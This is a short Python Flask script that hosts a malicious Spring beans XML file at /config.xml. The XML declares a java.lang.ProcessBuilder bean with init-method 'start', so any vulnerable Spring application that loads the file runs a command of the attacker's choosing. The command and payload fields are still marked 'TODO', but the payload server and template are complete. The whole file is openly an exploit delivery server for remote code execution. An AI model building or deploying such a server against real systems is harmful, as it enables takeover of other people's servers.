import random, string
from flask import Flask


app = Flask(__name__)


def generate_xml_data(shell_and_flags: str, payload: str) -> str:

    shell_and_flags_for_xml = ""
    for word in shell_and_flags.split(" "):
        shell_and_flags_for_xml += f"<value>{word}</value>"

    xml = f"""<?xml version="1.0" encoding="UTF-8"?>
    <beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
    <bean id="teehee" class="java.lang.ProcessBuilder" init-method="start">
    <constructor-arg>
      <list>
        {shell_and_flags_for_xml}
        <value>{payload}</value>
      </list>
    </constructor-arg>
    </bean>
    </beans>"""

    return xml


@app.route("/config.xml")
def serve_data():
    exploit_code = "TODO"
    shell_and_flags = "TODO"

    xml_data = generate_xml_data(shell_and_flags=shell_and_flags, payload=exploit_code)

    response = app.response_class(
        response=xml_data,
        status=200,
        mimetype="application/xml",
        headers={"Connection": "close", "Pragma": "no-cache"},
    )

    return response


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)  # TODO - do you want this to run on a different port or summin??
